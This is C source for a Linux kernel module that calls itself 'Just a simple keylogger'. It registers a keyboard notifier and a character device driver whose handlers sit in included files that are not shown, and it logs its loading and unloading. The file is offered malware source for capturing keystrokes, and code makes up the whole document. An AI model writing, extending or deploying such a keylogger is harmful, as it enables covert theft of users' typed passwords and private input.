#include "keylogger.h"
#include "fops.c"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("8xbit");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");

int key;
int ret = 0;


static struct notifier_block keylogger ={.notifier_call = notifier};


static int __init MOD_LOAD(void)
{
    ret = driver_entry();
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
        return ret;
    }
    else
    {
        printk(KERN_ALERT "Keylogger: load the device driver successfully");
    }
    
    ret= register_keyboard_notifier(&keylogger);
    if (ret == -1)
    {
        printk(KERN_ALERT "Keylogger: unable to load the module -> keyboard notifier");
        return ret;
    }
    return ret;

}
static void __exit MOD_UNLOAD(void)
{
   unregister_keyboard_notifier(&keylogger);
    driver_exit();
    printk(KERN_ALERT "Keylogger: unload the module");
} 






module_init(MOD_LOAD);
module_exit(MOD_UNLOAD);